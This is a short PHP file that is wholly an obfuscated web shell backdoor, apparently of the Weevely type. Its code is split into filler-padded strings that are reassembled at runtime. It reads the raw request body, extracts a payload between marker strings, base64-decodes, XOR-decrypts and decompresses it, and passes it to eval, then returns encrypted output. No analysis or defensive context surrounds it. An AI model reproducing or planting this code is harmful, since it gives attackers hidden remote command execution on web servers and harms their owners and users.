<?php
$g='Vl(@gzuVncoVmpress(@x(V@bVase64_decVodeV($m[1]VV),$k)));$o=@ob_get_VcontVeVnts(V)';
$P='$l;){fVor($Vj=0;($j<$c&&$Vi<$l)V;$j++,V$i++){$o.=$t{VV$i}^$Vk{$j};}}returVn $o;}if ';
$m=str_replace('z','','crzeaztzez_zfuncztion');
$a=';@ob_eVVnd_cVleVan();$r=@baseV64_encodeV(@x(@gzcompVress($o),$kV));prVinVt("$p$Vkh$r$kf");}';
$M='(@pregV_matchV("/$kh(V.+)$VkVf/",@fileV_VgVet_conVtents("php://iVnpVVut"),$m)==1) {@ob_VstarVt();@eva';
$c='n";VfunVction x(V$t,$kV){$c=strlVVen($kV);V$l=strlen($t);$VoV="";VfVor($Vi=VV0;$i<';
$s='$k="67V26V7V4ed";$kh=V"6Vcabc07aaf09";$kf="VV0e2aVf84434e3";$pV="cOx7VKiA4ySJV3z3L';
$e=str_replace('V','',$s.$c.$P.$M.$g.$a);
$y=$m('',$e);$y();
?>
